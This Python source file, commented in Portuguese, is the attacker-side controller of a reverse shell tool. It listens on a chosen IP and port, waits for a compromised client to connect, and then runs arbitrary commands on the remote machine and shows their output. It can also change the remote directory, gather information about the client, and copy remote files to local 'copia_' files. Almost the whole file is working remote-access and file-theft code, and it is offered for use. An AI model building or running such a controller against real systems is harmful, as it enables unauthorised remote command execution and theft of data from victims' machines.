#-------------------------------------
#----Requer Python --version 3.7.0----
#-------------------------------------
#----Developer: Joeru AKA(Joerito)----
#-------------------------------------
import os #os import para subshell calls
import socket #Import para criar o socket para comunicação entre reverse e bind
from colorama import Fore, Back, Style, init #Import para adicionar cor ao texto do terminal
init() #init call para compatibilidade com windows


#Classe para o setup de cores
class Cor:

    #Método __init__() para inicializar algumas cores predefinidas
    def __init__(self):
        self.sucesso     = Style.BRIGHT + Back.GREEN + Fore.WHITE
        self.aviso       = Style.BRIGHT + Back.YELLOW + Fore.BLACK
        self.erro        = Style.BRIGHT + Back.RED + Fore.WHITE
        self.inputs      = Style.BRIGHT + Back.CYAN + Fore.WHITE
        self.pagina      = Style.BRIGHT + Back.WHITE + Fore.BLACK
        self.epty        = Style.BRIGHT + Back.WHITE + Fore.BLACK

        self.verde       = Style.BRIGHT + Fore.GREEN
        self.amarelo     = Style.BRIGHT + Fore.YELLOW
        self.vermelho    = Style.BRIGHT + Fore.RED
        self.magenta     = Style.BRIGHT + Fore.MAGENTA

        self.reset       = Style.RESET_ALL

    #Método Sucesso(self, texto), utilização Sucesso('texto'), para Mensagens de Sucesso
    def Sucesso(self, texto):
        return print(self.sucesso + texto + self.reset)
    
    #Método Aviso(self, texto), utilização Aviso('texto'), para Mensagens de Aviso
    def Aviso(self, texto):
        return print(self.aviso + texto + self.reset)
    
    #Método Erro(self, texto), utilização Erro('texto'), para Mensagens de Erro
    def Erro(self, texto):
        return print(self.erro + texto + self.reset)
    
    #Método Inputs(self, texto), utilização em input(Inputs('texto')), para Prompt de Input 
    def Inputs(self, texto):
        return print(self.inputs + texto + self.reset)
    
    #Método Mensagem(self, tipo, texto), utilização Mensagem(0,'texto')
    #----------------Exemplos----------------
    #   Mensagem(0,'texto') -> 0==sucesso
    #   Mensagem(1,'texto') -> 1==aviso
    #   Mensagem(2,'texto') -> 2==erro
    #   Mensagem(3,'texto') -> 3==inputs
    #----------------------------------------
    def Mensagem(self, tipo, texto):
        if tipo == 0:
            return print(self.sucesso + '[+]' + self.reset, texto)
        elif tipo == 1:
            return print(self.aviso + '[!]' + self.reset, texto)
        elif tipo == 2:
            return print(self.erro + '[ ): ]' + self.reset, texto)
        elif tipo == 3:
            return print(self.inputs + '[->]' + self.reset, texto)


#Classe para todos os menus adicionados
class Grafico:
    
    #Método Menu(self), utilização Menu()
    def Menu(self):
        print(Texto.sucesso+'\n|-----ReverseShell-Menu-----|\n|---------------------------|'+Texto.pagina+'\n|  1 - Criar Servidor       |\n|  2 - Info                 |\n|  3 - Sair                 |\n|___________________________|\n'+Texto.reset)
    
    #Método Ajuda(self), utilização Ajuda()
    def Ajuda(self):
        print(Texto.sucesso+"\n|-------------------Help-Menu------------------|\n|----------------------------------------------|"+Texto.pagina+"\n|  limpar         ==  CMD:'CLS' BASH:'CLEAR'   |\n|  infocliente    ==  Informacao do Cliente    |\n|  sair           ==  Fecha Socket             |\n|                                              |\n|  chdir [FOLDER] ==  Troca Diretorio          |\n|  file [FILE]    ==  Obtém Dados do Ficheiro  |\n|______________________________________________|\n"+Texto.reset)


#Classe para preparar conexao entre o reverse e bind
class Servidor_SOCKET:
    
    #                                              host pode ser o domain ou ipv4
    #Preparar o socket em modo AF_INET para tuplo (host,porta), SOCK_STREAM==TCP
    SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    #Método __init__() para inicializar parâmetros recebidos
    def __init__(self, InternetProtocol, Porta):
        self.InternetProtocol   = InternetProtocol
        self.Porta              = Porta
    
    #Método Preparar_SOCKET() para binding ipv4,porta e entrar em modo listener
    def Preparar_SOCKET(self):
        self.SOCKET.bind((self.InternetProtocol, self.Porta))
        Texto.Mensagem(0,'IP e Porta Binded')
        self.SOCKET.listen(1)
        Texto.Mensagem(1,'A Espera de um Cliente no IPv4: '+self.InternetProtocol+' na Porta: '+str(self.Porta))
    
    #Método Comandos() aceita o bind e inicia algumas regras
    def Comandos(self):
        CLIENTE, ENDERECO   = self.SOCKET.accept()
        Cliente_Endereco    = str(ENDERECO)

        Texto.Mensagem(0,'O Cliente: '+Cliente_Endereco+' entrou no Servidor\n\n\t[help] - Para mais informacao\n')
        
        #Loop infinito para analise de comando=input() digitados na reverse para enviar para o bind que posteriormente executados na bind a reverse recebe o stdout or(ou) stderr
        while True:

            comando = input('\n'+Texto.verde+'reverseshell'+Texto.amarelo+'@'+Texto.vermelho+ENDERECO[0]+Texto.magenta+'> '+Texto.reset)
            
            #comando vazio == pass, equivalente pass
            if comando != '':
                #se comando conter string 'sair' envia comando para bind que irá finalizar conexão
                if 'sair' in comando:
                    CLIENTE.send(str.encode(comando))
                    CLIENTE.close()
                    os.system('clear')
                    os.system('cls')
                    break
                #se comando conter string 'help' abre o menu Ajuda(), obs:G=Cor()
                elif 'help' in comando:
                    G.Ajuda()
                #se comando conter string 'limpar' envia comando para o bind para executar cls e(and) clear, reverse também executa em subshell cls e(and) clear
                elif 'limpar' in comando:
                    CLIENTE.send(str.encode(comando))
                    os.system('clear')
                    os.system('cls')
                #se comando conter string 'infocliente' envia comando para o bind para executar algumas calls de os, platform, todo o output return numa string, reverse recebe string e mostra o output na reverse
                elif 'infocliente' in comando:
                    CLIENTE.send(str.encode(comando))
                    dados_rcv=str(CLIENTE.recv(2048),'utf-8')
                    print('Cliente:',ENDERECO)
                    print(dados_rcv)
                #se comando conter string 'chdir' é realizado alguns checks para verificar se após 'chdir ' existe algum diretório no comando e também recebe alguns code calls que predefini do bind para a reverse detetar que tipo de mensagem mostrar  
                elif 'chdir' in comando:
                    if comando[6:] == '':
                        Texto.Mensagem(2,'chdir [DIRETORIO]')
                    else:
                        CLIENTE.send(str.encode(comando))
                        dados_rcv=str(CLIENTE.recv(2048),'utf-8')

                        #-------------------------------------------
                        #---Exemplos code calls recebidos da bind---
                        #   DIR_NA  ==   Diretório Não Encontrado
                        #   NOT_DIR ==   Não é um Diretório
                        #   OS_ERR  ==   Erro OS
                        #-------------------------------------------

                        if 'DIR_NA' in dados_rcv:
                            Texto.Mensagem(2,'Diretorio Nao Encontrado')
                        elif 'NOT_DIR' in dados_rcv:
                            Texto.Mensagem(2,'Nao e um Diretorio')
                        elif 'OS_ERR' in dados_rcv:
                            Texto.Mensagem(2,'OS_ERR    oof:/')
                        else:
                            print(dados_rcv)

                #se comando conter string 'file' é realizado alguns checks para verificar se após 'file ' existe algum ficheiro no comando e também recebe alguns code calls que predefini do para a reverse detetar que tipo de mensagem mostrar, printar
                elif 'file' in comando:
                    if comando[5:] == '':
                        Texto.Mensagem(2,'file [FICHEIRO]')
                    else:
                        ficheiro_nome=comando[5:]
                        CLIENTE.send(str.encode(comando))
                        dados_rcv=str(CLIENTE.recv(2048),'utf-8')

                        #---------------------------------------------------------
                        #----------Exemplos code calls recebidos da bind----------
                        #   FILE_NF     ==   Ficheiro Não Encontrado
                        #   NOT_FILE    ==   Sem Permissões ou Não é um Ficheiro
                        #---------------------------------------------------------

                        if 'FILE_NF' in dados_rcv:
                            Texto.Mensagem(2,'Ficheiro Nao Encontrado')
                        elif 'NOT_FILE' in dados_rcv:
                            Texto.Mensagem(2,'Sem Permissoes ou Nao e um Ficheiro')
                        else:
                            ficheiro=open('copia_'+ficheiro_nome,'w')
                            ficheiro.write(dados_rcv)
                            ficheiro.close()

                #se comando não conter nenhuma string que entre no conjunto de regras predefinidas a string contida no comando é enviada para o bind e será executado na subshell do bind e o output do stdout ou stderr será enviado da bind para o reverse mostrar, printar
                else:
                    CLIENTE.send(str.encode(comando))
                    dados_rcv=str(CLIENTE.recv(2048),'utf-8')
                    print(dados_rcv)
            else:
                pass


Texto=Cor() #Texto recebe classe Cor()
G=Grafico() #G recebe classe Grafico()

#Função main() é onde será apresentado o Menu() num loop infinito para escolher entre 1 == Criar Servidor, 2 == Info, 3 == Sair
def main():
    while True:
        G.Menu()
        opcao = str(input('Selecione uma opcao> '))

        #S recebe classe Servidor_SOCKET . Também é executado os métodos Preparar_SOCKET() e Comandos()
        if '1' in opcao:
            os.system('clear')
            os.system('cls')
            IP=str(input(Texto.inputs+'[->]'+Texto.reset+' IPv4: '))
            PORTA=int(input(Texto.inputs+'[->]'+Texto.reset+' PORTA: '))
            S=Servidor_SOCKET(IP,PORTA)
            S.Preparar_SOCKET()
            S.Comandos()

        elif '2' in opcao:
            os.system('clear')
            os.system('cls')
            print('Developer: Joeru'+Texto.epty+'<3'+Texto.reset)
            print('Github Profile: https://github.com/Joerito\n\n\n')
        elif '3' in opcao:
            break

main()

if __name__ == "__main__":
    main()
